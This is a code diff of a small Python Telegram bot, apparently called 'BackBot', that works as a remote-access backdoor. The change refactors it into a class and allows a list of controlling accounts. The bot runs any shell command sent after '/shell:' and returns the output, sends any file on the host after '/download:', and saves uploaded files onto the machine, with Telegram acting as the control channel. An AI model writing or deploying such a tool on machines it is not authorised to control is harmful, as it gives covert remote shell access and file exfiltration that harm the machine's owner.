@@ -5,35 +5,35 @@ import os
 # telegram api token
 API_TOKEN = "YOUR_API_TOKEN_HERE"
 
-# telegram account id
+# telegram account id list
 # your bot will only listen to commands from this account
-MASTER_ID = 999999999
-
-bot = telepot.Bot(API_TOKEN)
+MASTER_ID = [999999999]
 
 
-def message_handler(message):
-    content_type, chat_type, user_id = telepot.glance2(message)
+class BackBot(telepot.Bot):
+    def handle(self, msg):
+        content_type, chat_type, user_id = telepot.glance2(msg)
 
-    if user_id == MASTER_ID:
-        if content_type == "text":
-            text = message["text"]
-            if '/shell:' in text:
-                cmd = text[7:]
-                proc = os.popen(cmd)
-                bot.sendMessage(user_id, proc.read())
-            elif '/download:' in text:
-                path = text[10:]
-                doc = open(path, 'rb')
-                bot.sendDocument(user_id, doc)
-        elif content_type == "document":
-            file_id = message["document"]["file_id"]
-            file_name = message["document"]["file_name"]
-            bot.downloadFile(file_id, file_name)
+        if user_id in MASTER_ID:
+            if content_type == "text":
+                text = msg["text"]
+                if '/shell:' in text:
+                    cmd = text[7:]
+                    proc = os.popen(cmd)
+                    self.sendMessage(user_id, proc.read())
+                elif '/download:' in text:
+                    path = text[10:]
+                    doc = open(path, 'rb')
+                    self.sendDocument(user_id, doc)
+            elif content_type == "document":
+                file_id = msg["document"]["file_id"]
+                file_name = msg["document"]["file_name"]
+                self.downloadFile(file_id, file_name)
 
 
 def main():
-    bot.notifyOnMessage(message_handler)
+    bot = BackBot(API_TOKEN)
+    bot.notifyOnMessage()
 
     while True:
         time.sleep(10)
